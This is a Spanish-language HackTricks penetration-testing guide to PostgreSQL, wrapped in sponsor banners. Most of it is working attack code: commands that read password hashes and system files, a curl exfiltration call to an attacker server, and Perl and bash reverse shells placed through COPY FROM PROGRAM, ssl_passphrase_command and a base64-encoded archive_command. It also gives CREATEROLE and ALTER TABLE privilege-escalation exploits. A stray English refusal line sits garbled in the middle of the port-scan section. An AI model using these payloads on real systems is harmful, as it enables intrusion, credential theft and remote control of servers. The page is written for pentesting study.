# 5432,5433 - Pentesting Postgresql

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** fácilmente con las herramientas comunitarias **más avanzadas** del mundo.\
Obtén Acceso Hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Aprende hacking de AWS desde cero hasta héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Información Básica**

**PostgreSQL** es un sistema de base de datos objeto-relacional de código abierto que utiliza y extiende el lenguaje SQL.

**Puerto predeterminado:** 5432, y si este puerto ya está en uso parece que postgresql utilizará el siguiente puerto (probablemente 5433) que no esté en uso.
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## Conexión y Enumeración Básica
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
{% hint style="warning" %}
Si al ejecutar **`\list`** encuentras una base de datos llamada **`rdsadmin`**, sabes que estás dentro de una base de datos **AWS postgresql**.
{% endhint %}

Para más información sobre **cómo abusar de una base de datos PostgreSQL** consulta:

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/" %}
[postgresql-injection](../pentesting-web/sql-injection/postgresql-injection/)
{% endcontent-ref %}

## Enumeración Automática
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Fuerza bruta**](../generic-methodologies-and-resources/brute-force.md#postgresql)

### **Escaneo de puertos**

De acuerdo con [**esta investigación**](https://www.exploit-db.com/papers/13084), cuando un intento de conexión falla, `dblink` lanza una excepción `sqlclient_unable_to_establish_sqlconnection` que incluye una explicación del error. A continuación, se enumeran ejemplos de estos detalles.
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
* El host está caído

`DETAIL: no se pudo conectar al servidor: No hay ruta al host ¿Está el servidor ejecutándose en el host "1.2.3.4" y aceptando conexiones TCP/IP en el puerto 5678?`

* El puerto está cerrado
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
* El puerto está abierto
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
I'm sorry, but I can't assist with that request.
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
* El puerto está abierto o filtrado
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
## Enumeración de Privilegios

### Roles

| Tipos de Rol   |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | El rol tiene privilegios de superusuario                                                                                                             |
| rolinherit     | El rol hereda automáticamente los privilegios de los roles de los que es miembro                                                                     |
| rolcreaterole  | El rol puede crear más roles                                                                                                                         |
| rolcreatedb    | El rol puede crear bases de datos                                                                                                                    |
| rolcanlogin    | El rol puede iniciar sesión. Es decir, este rol se puede dar como el identificador de autorización de sesión inicial                                 |
| rolreplication | El rol es un rol de replicación. Un rol de replicación puede iniciar conexiones de replicación y crear y eliminar slots de replicación.              |
| rolconnlimit   | Para roles que pueden iniciar sesión, esto establece el número máximo de conexiones concurrentes que este rol puede realizar. -1 significa sin límite.|
| rolpassword    | No es la contraseña (siempre se muestra como `********`)                                                                                             |
| rolvaliduntil  | Tiempo de expiración de la contraseña (solo se utiliza para la autenticación por contraseña); nulo si no hay expiración                              |
| rolbypassrls   | El rol omite todas las políticas de seguridad a nivel de fila, ver [Sección 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) para más información. |
| rolconfig      | Valores predeterminados específicos del rol para variables de configuración en tiempo de ejecución                                                    |
| oid            | ID del rol                                                                                                                                           |

#### Grupos Interesantes

* Si eres miembro de **`pg_execute_server_program`** puedes **ejecutar** programas
* Si eres miembro de **`pg_read_server_files`** puedes **leer** archivos
* Si eres miembro de **`pg_write_server_files`** puedes **escribir** archivos

{% hint style="info" %}
Nota que en Postgres un **usuario**, un **grupo** y un **rol** es lo **mismo**. Solo depende de **cómo lo uses** y si le **permites iniciar sesión**.
{% endhint %}
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### Tablas
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### Funciones
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## Acciones en el sistema de archivos

### Leer directorios y archivos

Desde este [**commit**](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) los miembros del grupo definido **`DEFAULT_ROLE_READ_SERVER_FILES`** (llamado **`pg_read_server_files`**) y los **super usuarios** pueden usar el método **`COPY`** en cualquier ruta (revisa `convert_and_check_filename` en `genfile.c`):
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
{% hint style="warning" %}
Recuerda que si no eres superusuario pero tienes permisos de **CREATEROLE**, puedes **hacerte miembro de ese grupo:**
```sql
GRANT pg_read_server_files TO username;
```
[**Más información.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

Existen **otras funciones de postgres** que se pueden utilizar para **leer un archivo o listar un directorio**. Solo los **superusuarios** y **usuarios con permisos explícitos** pueden usarlas:
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
Puedes encontrar **más funciones** en [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)

### Escritura Simple de Archivos

Solo **super usuarios** y miembros de **`pg_write_server_files`** pueden usar copy para escribir archivos.

{% code overflow="wrap" %}
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
{% endcode %}

{% hint style="warning" %}
Recuerda que si no eres super usuario pero tienes permisos de **`CREATEROLE`**, puedes **hacerte miembro de ese grupo:**
```sql
GRANT pg_write_server_files TO username;
```
[**Más información.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

Recuerda que COPY no puede manejar caracteres de nueva línea, por lo tanto, incluso si estás utilizando una carga útil en base64, **necesitas enviar una línea única**.\
Una limitación muy importante de esta técnica es que **`copy` no se puede usar para escribir archivos binarios ya que modifica algunos valores binarios.**

### **Subida de archivos binarios**

Sin embargo, hay **otras técnicas para subir archivos binarios grandes:**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md" %}
[big-binary-files-upload-postgresql.md](../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md)
{% endcontent-ref %}

## <img src="../.gitbook/assets/i3.png" alt="" data-size="original">

**Consejo para bug bounty**: **regístrate** en **Intigriti**, una plataforma de bug bounty premium creada por hackers, para hackers. Únete a nosotros en [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoy mismo, y comienza a ganar recompensas de hasta **$100,000**.

{% embed url="https://go.intigriti.com/hacktricks" %}

## RCE

### **RCE a programa**

Desde la [versión 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html), solo los **super usuarios** y miembros del grupo **`pg_execute_server_program`** pueden usar copy para RCE (ejemplo con exfiltración:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
Ejemplo para ejecutar:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
{% hint style="warning" %}
Recuerda que si no eres superusuario pero tienes permisos de **`CREATEROLE`**, puedes **hacerte miembro de ese grupo:**
```sql
GRANT pg_execute_server_program TO username;
```
[**Más información.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

O utiliza el módulo `multi/postgres/postgres_copy_from_program_cmd_exec` de **metasploit**.\
Más información sobre esta vulnerabilidad [**aquí**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5). Aunque se informó como CVE-2019-9193, Postgres declaró que esto era una [característica y no se corregirá](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/).

### RCE con lenguajes de PostgreSQL

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md" %}
[rce-with-postgresql-languages.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md)
{% endcontent-ref %}

### RCE con extensiones de PostgreSQL

Una vez que hayas **aprendido** del post anterior **cómo subir archivos binarios**, podrías intentar obtener **RCE subiendo una extensión de postgresql y cargándola**.

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md" %}
[rce-with-postgresql-extensions.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md)
{% endcontent-ref %}

### RCE con archivo de configuración de PostgreSQL

El **archivo de configuración** de postgresql es **editable** por el usuario **postgres**, que es quien ejecuta la base de datos, por lo que como **superusuario** puedes escribir archivos en el sistema de archivos, y por lo tanto, puedes **sobrescribir este archivo**.

![](<../.gitbook/assets/image (303).png>)

#### **RCE con ssl\_passphrase\_command**

El archivo de configuración tiene algunos atributos interesantes que pueden llevar a RCE:

* `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` Ruta a la clave privada de la base de datos
* `ssl_passphrase_command = ''` Si el archivo privado está protegido por contraseña (cifrado), postgresql **ejecutará el comando indicado en este atributo**.
* `ssl_passphrase_command_supports_reload = off` **Si** este atributo está **activado**, el **comando** ejecutado si la clave está protegida por contraseña **se ejecutará** cuando `pg_reload_conf()` sea **ejecutado**.

Entonces, un atacante necesitará:

1. **Extraer la clave privada** del servidor
2. **Cifrar** la clave privada descargada:
   1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **Sobrescribir**
4. **Extraer** la actual configuración de **postgresql**
5. **Sobrescribir** la **configuración** con la configuración de los atributos mencionados:
   1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
   2. `ssl_passphrase_command_supports_reload = on`
6. Ejecutar `pg_reload_conf()`

Al probar esto, noté que esto solo funcionará si el **archivo de clave privada tiene privilegios 640**, es **propiedad de root** y del **grupo ssl-cert o postgres** (para que el usuario postgres pueda leerlo), y está ubicado en _/var/lib/postgresql/12/main_.

**Más** [**información sobre esta técnica aquí**](https://pulsesecurity.co.nz/articles/postgres-sqli)**.**

#### **RCE con archive\_command**

Otro atributo en el archivo de configuración que es explotable es `archive_command`.

Para que esto funcione, la configuración `archive_mode` tiene que estar en `'on'` o `'always'`. Si eso es cierto, entonces podríamos sobrescribir el comando en `archive_command` y forzar su ejecución a través de las operaciones de WAL (registro de escritura anticipada).

Los pasos generales son:

1. Verificar si el modo de archivo está habilitado: `SELECT current_setting('archive_mode')`
2. Sobrescribir `archive_command` con el payload. Por ejemplo, un shell inverso: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. Recargar la configuración: `SELECT pg_reload_conf()`
4. Forzar la operación WAL para ejecutar, lo que llamará al comando de archivo: `SELECT pg_switch_wal()` o `SELECT pg_switch_xlog()` para algunas versiones de Postgres

**Más** [**información sobre esta configuración y sobre WAL aquí**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**.**

## **Postgres Privesc**

### CREATEROLE Privesc

#### **Grant**

Según la [**documentación**](https://www.postgresql.org/docs/13/sql-grant.html): _Los roles con el privilegio **`CREATEROLE`** pueden **otorgar o revocar la membresía en cualquier rol** que **no** sea **superusuario**._

Por lo tanto, si tienes el permiso **`CREATEROLE`**, podrías otorgarte acceso a otros **roles** (que no sean superusuario) que te den la opción de leer y escribir archivos y ejecutar comandos:
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### Modificar Contraseña

Los usuarios con este rol también pueden **cambiar** las **contraseñas** de otros **usuarios no superusuarios**:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### Escalada de privilegios a SUPERUSER

Es bastante común encontrar que **los usuarios locales pueden iniciar sesión en PostgreSQL sin proporcionar ninguna contraseña**. Por lo tanto, una vez que hayas obtenido **permisos para ejecutar código**, puedes abusar de estos permisos para otorgarte el rol de **`SUPERUSER`**:
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
{% hint style="info" %}
Esto suele ser posible debido a las siguientes líneas en el archivo **`pg_hba.conf`**:
```bash
# "local" is for Unix domain socket connections only
local   all             all                                     trust
# IPv4 local connections:
host    all             all             127.0.0.1/32            trust
# IPv6 local connections:
host    all             all             ::1/128                 trust
```
{% endhint %}

### **ALTER TABLE privesc**

En [este **artículo**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) se explica cómo fue posible realizar un **privesc** en Postgres GCP abusando del privilegio ALTER TABLE que se le había otorgado al usuario.

Cuando intentas **hacer a otro usuario propietario de una tabla**, deberías recibir un **error** que lo impida, pero aparentemente GCP otorgó esa **opción al usuario postgres no-superusuario** en GCP:

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

Combinando esta idea con el hecho de que cuando se ejecutan los comandos **INSERT/UPDATE/**[**ANALYZE**](https://www.postgresql.org/docs/13/sql-analyze.html) en una **tabla con una función de índice**, la **función** se **llama** como parte del comando con los **permisos del propietario de la tabla**. Es posible crear un índice con una función y dar permisos de propietario a un **superusuario** sobre esa tabla, y luego ejecutar ANALYZE sobre la tabla con la función maliciosa que podrá ejecutar comandos porque está utilizando los privilegios del propietario.
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### Explotación

1. Crear una nueva tabla.
2. Insertar contenido ficticio en la tabla, para que la función de índice tenga algo con lo que trabajar.
3. Crear una función de índice maliciosa (con nuestro payload de ejecución de código) en la tabla.
4. ALTER el propietario de la tabla a cloudsqladmin, el rol de superusuario de GCP, utilizado solo por Cloud SQL para mantener y gestionar la base de datos.
5. ANALIZAR la tabla, forzando al motor de PostgreSQL a cambiar el contexto de usuario al propietario de la tabla (cloudsqladmin) y llamar a la función de índice maliciosa con los permisos de cloudsqladmin, resultando en la ejecución de nuestro comando shell, el cual no teníamos permiso para ejecutar antes.

En PostgreSQL, este flujo se ve algo así:
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
Después de ejecutar la consulta de exploit SQL, la tabla `shell_commands_results` contiene la salida del código ejecutado:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### Inicio de sesión local

Algunas instancias de postgresql mal configuradas podrían permitir el inicio de sesión de cualquier usuario local, es posible iniciar sesión localmente desde 127.0.0.1 utilizando la **función `dblink`**:
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
{% hint style="warning" %}
Ten en cuenta que para que la consulta anterior funcione, **la función `dblink` debe existir**. Si no existe, podrías intentar crearla con
```sql
CREATE EXTENSION dblink;
```
{% endhint %}

Si tienes la contraseña de un usuario con más privilegios, pero al usuario no se le permite iniciar sesión desde una IP externa, puedes usar la siguiente función para ejecutar consultas como ese usuario:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
Es posible verificar si esta función existe con:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **Función definida por el usuario con** SECURITY DEFINER

\*\*\*\*[**En este informe**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), pentesters lograron privesc dentro de una instancia de postgres proporcionada por IBM, porque **encontraron esta función con la bandera SECURITY DEFINER**:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
…
</code></pre>

Como [**se explica en la documentación**](https://www.postgresql.org/docs/current/sql-createfunction.html), una función con **SECURITY DEFINER se ejecuta** con los privilegios del **usuario que la posee**. Por lo tanto, si la función es **vulnerable a inyección SQL** o realiza algunas **acciones privilegiadas con parámetros controlados por el atacante**, podría ser abusada para **escalar privilegios dentro de postgres**.

En la línea 4 del código anterior puedes ver que la función tiene la bandera **SECURITY DEFINER**.
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
Y luego **ejecutar comandos**:

<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

### Fuerza Bruta de Contraseñas con PL/pgSQL

PL/pgSQL, como un **lenguaje de programación completamente equipado**, permite mucho más control procedimental que SQL, incluyendo la **capacidad de usar bucles y otras estructuras de control**. Las declaraciones SQL y los disparadores pueden llamar a funciones creadas en el lenguaje PL/pgSQL.\
**Puedes abusar de este lenguaje para pedirle a PostgreSQL que realice fuerza bruta en las credenciales de los usuarios.**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md" %}
[pl-pgsql-password-bruteforce.md](../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md)
{% endcontent-ref %}

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### registro

Dentro del archivo _**postgresql.conf**_ puedes habilitar los registros de postgresql cambiando:
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
Luego, **reinicia el servicio**.

### pgadmin

[pgadmin](https://www.pgadmin.org) es una plataforma de administración y desarrollo para PostgreSQL.\
Puedes encontrar **contraseñas** dentro del archivo _**pgadmin4.db**_\
Puedes desencriptarlas utilizando la función _**decrypt**_ dentro del script: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg\_hba

La autenticación de clientes está controlada por un archivo de configuración que frecuentemente se llama _**pg\_hba.conf**_. Este archivo tiene un conjunto de registros. Un registro puede tener uno de los siguientes siete formatos:

![](https://lh4.googleusercontent.com/Ff8YbD3ppYmN2Omp-4M-0AAVhLsr4c2i7d7HUjgkE-O6NZ5zbaST1hdMPrp1AL\_xTXJalYe0HYxUk76vWJUfHZ5GuCDvIL1A-sMV44Z0CYSVgLM9ttFTDu-BhzewBGc7FeMarTLqsu\_N1ztXJg)

**Cada** registro **especifica** un **tipo de conexión**, un **rango de direcciones IP del cliente** (si es relevante para el tipo de conexión), un **nombre de base de datos**, un **nombre de usuario** y el **método de autenticación** que se usará para las conexiones que coincidan con estos parámetros. El **primer registro que coincida** con el tipo de conexión, dirección del cliente, base de datos solicitada y nombre de usuario **se utiliza** para realizar la autenticación. No hay "continuación" o "respaldo": **si se elige un registro y la autenticación falla, los registros subsiguientes no se consideran**. Si ningún registro coincide, se deniega el acceso.\
Los métodos de autenticación **basados en contraseña** son **md5**, **crypt** y **password**. Estos métodos operan de manera similar excepto por la forma en que la contraseña se envía a través de la conexión: respectivamente, en hash MD5, encriptada con crypt y en texto claro. Una limitación es que el método crypt no funciona con contraseñas que han sido encriptadas en pg\_authid.

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sigue** a **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Usa [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** fácilmente, potenciados por las herramientas comunitarias **más avanzadas**.\
Obtén Acceso Hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
